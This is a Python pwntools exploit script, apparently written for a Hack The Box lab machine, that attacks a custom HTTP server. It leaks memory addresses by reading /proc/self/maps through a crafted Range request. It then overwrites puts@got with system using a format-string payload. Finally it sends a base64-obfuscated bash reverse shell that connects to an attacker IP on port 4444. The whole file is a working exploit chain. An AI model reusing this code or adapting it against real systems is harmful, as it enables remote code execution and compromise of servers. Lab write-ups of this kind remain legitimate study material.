#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

if len(sys.argv) < 2:
    print 'Usage : python exploit.py <mode>\nAvailable modes: local/remote'
    sys.exit(0)
mode = sys.argv[1]
if mode == 'local':
    p = remote('localhost', 9999)
    elf = ELF('./httpserver', checksec=False)
    libc = ELF('/usr/lib32/libc-2.29.so', checksec=False)
elif mode == 'remote':
    p = remote('10.10.10.148', 9999)
    elf = ELF('./httpserver', checksec=False)
    libc = ELF('./libc.so.6', checksec=False)
else:
    print 'Available modes: local/remote'
    sys.exit(0)

# leak addresses from /proc/self/maps
request = 'GET {} \r\nRange: bytes=0-1000\r\n'.format(urlencode('//proc/self/maps'))
p.sendline(request)
resp = p.recv().split('\n')
elf_base = int('0x' + resp[6].split('-')[0], 16)
libc_base = int('0x' + resp[12].split('-')[0], 16)
puts = elf_base + elf.got['puts']
system = libc_base + libc.symbols['system']
log.success('puts@got : {}'.format(hex(puts)))
log.success('system@GLIBC : {}'.format(hex(system)))

# shell
if mode == 'local':
    p = remote('localhost', 9999)
elif mode == 'remote':
    p = remote('10.10.10.148', 9999)
payload = fmtstr_payload(53, {puts:system})
# workaround for bash -i>& /dev/tcp/10.10.15.222/4444 0>&1
rev = 'echo${IFS}YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE1LjIyMi80NDQ0IDA+JjEK|base64${IFS}-d|bash'
request = rev + ' ' + urlencode(payload) + ' \r\n'
log.success('spawning shell')
p.sendline(request)
